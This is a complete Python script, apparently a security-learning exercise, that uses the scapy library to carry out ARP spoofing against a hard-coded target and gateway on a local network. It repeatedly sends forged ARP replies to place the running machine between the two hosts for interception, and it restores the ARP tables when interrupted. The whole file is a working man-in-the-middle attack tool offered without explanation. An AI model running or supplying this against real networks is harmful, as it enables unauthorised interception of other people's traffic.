import scapy.all as sc
import time


def get_mac(ip):
    arp_request = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = sc.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sc.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = sc.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    sc.send(packet, count=4, verbose=False)


target_ip = '192.168.100.93'
gateway_ip = '192.168.100.1'

try:
    send_packets_count = 0
    while True:
        send_packets_count += 2
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        print('\r[+] Packets sent:', send_packets_count, end=' ')
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C .............. Resetting ARP tables...... Please wsit.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
